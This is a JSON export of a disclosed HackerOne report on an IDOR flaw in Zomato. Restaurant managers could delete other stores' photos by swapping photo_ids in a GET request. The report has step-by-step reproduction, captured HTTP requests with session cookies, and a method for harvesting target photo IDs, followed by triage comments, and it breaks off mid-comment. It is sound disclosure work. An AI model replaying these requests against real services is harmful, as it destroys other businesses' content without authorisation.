{"id":404797,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDQ3OTc=","url":"https://hackerone.com/reports/404797","title":"IDOR to delete images from other stores","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-09-03T16:42:10.715Z","submitted_at":"2018-09-03T16:42:10.715Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"emitrani","url":"/emitrani","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-09-05T17:01:23.798Z","bug_reporter_agreed_on_going_public_at":"2018-09-05T15:11:33.350Z","team_member_agreed_on_going_public_at":"2018-09-05T17:01:23.591Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** The parameter `photo_ids` in below request is vulnerable to IDOR\n\n/php/client_manage_handler?██████████\u0026case=remove-active-photo\n\n**Description:** Since there is no check for res_id or ownership I was able to delete Gerben's image by just using the photo_id from his store. This is a problem because it is a get request and I can try a bunch of ID's to randomly delete photos that don't belong to me or try to find a way to leak this ID from store page to do targeted deletes. \n\nI believe if you try to delete multiple photos there will be more ids in the request so that would allow to expand the attack by trying a lot of ids at once.\n\n**Platform(s) Affected:** [website]\n\n\n## Steps To Reproduce:\n\n\n  1. Get 2 stores.\n  2. With store 1 navigate to https://www.zomato.com/clients/manage_photos.php\n  3. Start to delete a photo and capture the request that looks like :\n\n```\nGET /php/client_manage_handler?███\u0026case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\n```\n\n4 . Save the photo_ids parameter\n5 . Go to your second restaurant account and capture the same request with a different res_id and cookies\n6 . Replace the `photo_ids` with the id from step 4 and send request.\n7 . Observe the photo is deleted.\n\n## Impact\n\nBy using targeted or blind attacks it is possible to delete photos that don't belong to a restaurant because of this IDOR. My leading theory is that currently you are checking that the logged in user has permissions on the res_id in the request but not verifying that the res_id owns that photograph. There should be an additional check to ensure that the photo_id belongs to that restaurant before deleting it.\n\nRegards,\nEray","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e The parameter \u003ccode\u003ephoto_ids\u003c/code\u003e in below request is vulnerable to IDOR\u003c/p\u003e\n\n\u003cp\u003e/php/client_manage_handler?██████████\u0026amp;case=remove-active-photo\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e Since there is no check for res_id or ownership I was able to delete Gerben\u0026#39;s image by just using the photo_id from his store. This is a problem because it is a get request and I can try a bunch of ID\u0026#39;s to randomly delete photos that don\u0026#39;t belong to me or try to find a way to leak this ID from store page to do targeted deletes. \u003c/p\u003e\n\n\u003cp\u003eI believe if you try to delete multiple photos there will be more ids in the request so that would allow to expand the attack by trying a lot of ids at once.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePlatform(s) Affected:\u003c/strong\u003e [website]\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eGet 2 stores.\u003c/li\u003e\n\u003cli\u003eWith store 1 navigate to \u003ca title=\"https://www.zomato.com/clients/manage_photos.php\" href=\"/redirect?url=https%3A%2F%2Fwww.zomato.com%2Fclients%2Fmanage_photos.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.zomato.com/clients/manage_photos.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eStart to delete a photo and capture the request that looks like :\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /php/client_manage_handler?███\u0026amp;case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e4 . Save the photo_ids parameter\u003cbr\u003e\n5 . Go to your second restaurant account and capture the same request with a different res_id and cookies\u003cbr\u003e\n6 . Replace the \u003ccode\u003ephoto_ids\u003c/code\u003e with the id from step 4 and send request.\u003cbr\u003e\n7 . Observe the photo is deleted.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eBy using targeted or blind attacks it is possible to delete photos that don\u0026#39;t belong to a restaurant because of this IDOR. My leading theory is that currently you are checking that the logged in user has permissions on the res_id in the request but not verifying that the res_id owns that photograph. There should be an additional check to ensure that the photo_id belongs to that restaurant before deleting it.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nEray\u003c/p\u003e\n","bounty_amount":"600.0","formatted_bounty":"$600","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":47,"voters":["libcontainer","spam404","miguel_santareno","mik317","sameerphad72","flashdisk","emitrani","mygf","generaleg","aryan2808","and 37 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3286156,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"POC:\n\n{F341857}","markdown_message":"\u003cp\u003ePOC:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"proof.JPG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?response-content-disposition=attachment%3B%20filename%3D%22proof.JPG%22%3B%20filename%2A%3DUTF-8%27%27proof.JPG\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055211Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=372944cb50563efc74827e35f8e6ee3ad23bcd60c3948e81b7d5f15d7e3be671\" data-attachment-type=\"image/jpeg\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?response-content-disposition=attachment%3B%20filename%3D%22proof.JPG%22%3B%20filename%2A%3DUTF-8%27%27proof.JPG\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055211Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=372944cb50563efc74827e35f8e6ee3ad23bcd60c3948e81b7d5f15d7e3be671\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T16:45:24.790Z","updated_at":"2018-09-03T16:45:24.790Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":341857,"filename":"proof.JPG","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?response-content-disposition=attachment%3B%20filename%3D%22proof.JPG%22%3B%20filename%2A%3DUTF-8%27%27proof.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055211Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=372944cb50563efc74827e35f8e6ee3ad23bcd60c3948e81b7d5f15d7e3be671"}],"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286175,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @emitrani,\n\nThank you for your submission. We are investigating your report, and will let you know if we have any questions. We appreciate your assistance and cooperation.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/emitrani\"\u003e@emitrani\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. We are investigating your report, and will let you know if we have any questions. We appreciate your assistance and cooperation.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T16:54:54.956Z","updated_at":"2018-09-03T16:54:54.956Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286176,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-03T16:55:04.079Z","updated_at":"2018-09-03T16:55:04.079Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":204903,"new_severity_id":204912},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286429,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @prateek_0490-zomato,\n\nI found a way to get the photo_id from restaurants to do targeted deleting of photos. I believe in light of this information you might reconsider the severity as only prerequisite to perform this attack becomes owning a restaurant manager account.\n\nIf you go to a restaurant page like https://www.zomato.com/washington-dc/old-ebbitt-grill-downtown and click `All photos` and intercept the request you will see the following:\n\n```\nPOST //php/photoviewerData.php HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 384\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=9989b21f95f2ab2f41f11ec304f6ac58f2c445f4; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1536001591:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=427c02f9f422eb1ca8fd81723c912253; orange=4411464; al=1; session_id=null; csrf=cd01d3d66835a75f5588852cf26e26d4; ak_bmsc=311D3563BCBA40C5DE755ACA53DC87B4B81C11952E6F00000F868D5B7834CA25~pllXy4xKhsB6DdsDwY8KYOHpXwOkLLHZbn56SG9EI0T5FaEGmiI8C+T9b65LICM+C4OMSgfQfx+VnBdzdQ9Ik08Ns7GzhnXsFhBdcX+NAlaa1oEoH77wHYEa/XFNwmuoX4hH9gF30/pt9nGUvDWhqkplkpIgGNiPMQGMy/lJ3wwrngS6yPYpJbpcbpwPKDJRxrP50xMVVmBTkPWrLCLdWB8Izo3j3WTrfj4iLXHK7wMhM=; LEL_JS=true; bm_sv=3D12D8CA594927210BEA1A7E276CF8C2~ijgWzSmJx+1gIjjBTZB9Fb60dSMUdE+oQmtZ29nwYqRUFbO3Kz9+MMRSD4Iu5j7pZf5mB2Vq4uV7SPqLLUiGFqsujq2n5Oxbju2sGWmhTDjpWQ7x7sI6gOwI0FQr6BPh22qhaP/D+6+0fNutGhlxHr6lAro/aXJjqCoO9wMdH0c=; AMP_TOKEN=%24NOT_FOUND\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\nphotoviewersize=NORMAL\u0026photo_id=u_1MDU1NjE2NzE5M\u0026type=res\u0026index=1\u0026category=all\u0026res_id=16872578\u0026group_id=false\u0026onPage=true\u0026moreToFetch%5B%5D=0\u0026moreToFetch%5B%5D=1\u0026moreToFetch%5B%5D=2\u0026moreToFetch%5B%5D=3\u0026moreToFetch%5B%5D=4\u0026moreToFetch%5B%5D=5\u0026moreToFetch%5B%5D=6\u0026moreToFetch%5B%5D=7\u0026moreToFetch%5B%5D=8\u0026moreToFetch%5B%5D=9\u0026moreToFetch%5B%5D=10\u0026moreToFetch%5B%5D=11\u0026moreToFetch%5B%5D=12\n```\n\nWhere `photo_id` parameter can be used to delete said photo. Might have to change the u_ to r_ but I'm not sure as I didn't try to delete a photo in production.\n\nRegards,\nEray ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/prateek_0490-zomato\"\u003e@prateek_0490-zomato\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI found a way to get the photo_id from restaurants to do targeted deleting of photos. I believe in light of this information you might reconsider the severity as only prerequisite to perform this attack becomes owning a restaurant manager account.\u003c/p\u003e\n\n\u003cp\u003eIf you go to a restaurant page like \u003ca title=\"https://www.zomato.com/washington-dc/old-ebbitt-grill-downtown\" href=\"/redirect?url=https%3A%2F%2Fwww.zomato.com%2Fwashington-dc%2Fold-ebbitt-grill-downtown\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.zomato.com/washington-dc/old-ebbitt-grill-downtown\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and click \u003ccode\u003eAll photos\u003c/code\u003e and intercept the request you will see the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST //php/photoviewerData.php HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 384\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=9989b21f95f2ab2f41f11ec304f6ac58f2c445f4; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1536001591:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=427c02f9f422eb1ca8fd81723c912253; orange=4411464; al=1; session_id=null; csrf=cd01d3d66835a75f5588852cf26e26d4; ak_bmsc=311D3563BCBA40C5DE755ACA53DC87B4B81C11952E6F00000F868D5B7834CA25~pllXy4xKhsB6DdsDwY8KYOHpXwOkLLHZbn56SG9EI0T5FaEGmiI8C+T9b65LICM+C4OMSgfQfx+VnBdzdQ9Ik08Ns7GzhnXsFhBdcX+NAlaa1oEoH77wHYEa/XFNwmuoX4hH9gF30/pt9nGUvDWhqkplkpIgGNiPMQGMy/lJ3wwrngS6yPYpJbpcbpwPKDJRxrP50xMVVmBTkPWrLCLdWB8Izo3j3WTrfj4iLXHK7wMhM=; LEL_JS=true; bm_sv=3D12D8CA594927210BEA1A7E276CF8C2~ijgWzSmJx+1gIjjBTZB9Fb60dSMUdE+oQmtZ29nwYqRUFbO3Kz9+MMRSD4Iu5j7pZf5mB2Vq4uV7SPqLLUiGFqsujq2n5Oxbju2sGWmhTDjpWQ7x7sI6gOwI0FQr6BPh22qhaP/D+6+0fNutGhlxHr6lAro/aXJjqCoO9wMdH0c=; AMP_TOKEN=%24NOT_FOUND\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\nphotoviewersize=NORMAL\u0026amp;photo_id=u_1MDU1NjE2NzE5M\u0026amp;type=res\u0026amp;index=1\u0026amp;category=all\u0026amp;res_id=16872578\u0026amp;group_id=false\u0026amp;onPage=true\u0026amp;moreToFetch%5B%5D=0\u0026amp;moreToFetch%5B%5D=1\u0026amp;moreToFetch%5B%5D=2\u0026amp;moreToFetch%5B%5D=3\u0026amp;moreToFetch%5B%5D=4\u0026amp;moreToFetch%5B%5D=5\u0026amp;moreToFetch%5B%5D=6\u0026amp;moreToFetch%5B%5D=7\u0026amp;moreToFetch%5B%5D=8\u0026amp;moreToFetch%5B%5D=9\u0026amp;moreToFetch%5B%5D=10\u0026amp;moreToFetch%5B%5D=11\u0026amp;moreToFetch%5B%5D=12\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhere \u003ccode\u003ephoto_id\u003c/code\u003e parameter can be used to delete said photo. Might have to change the u_ to r_ but I\u0026#39;m not sure as I didn\u0026#39;t try to delete a photo in production.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nEray \u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T19:11:17.089Z","updated_at":"2018-09-03T19:13:52.878Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286511,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@emitrani One has to be a restaurant manager is itself a bit of task to perform this action. \n\nAre you able to delete User's Posted Images too? Like can you delete this?\n\n████████\n\nThanks.","markdown_message":"\u003cp\u003e\u003ca href=\"/emitrani\"\u003e@emitrani\u003c/a\u003e One has to be a restaurant manager is itself a bit of task to perform this action. \u003c/p\u003e\n\n\u003cp\u003eAre you able to delete User\u0026#39;s Posted Images too? Like can you delete this?\u003c/p\u003e\n\n\u003cp\u003e████████\u003c/p\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T19:53:12.505Z","updated_at":"2018-09-05T16:59:29.993Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286535,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think I can only delete photos starting with r_ as in posted by restaurant but I'm not entirely sure. I got a success response back so it might take some time to be removed from s3. \n\nI checked I can only delete something with r_. I can show it with that 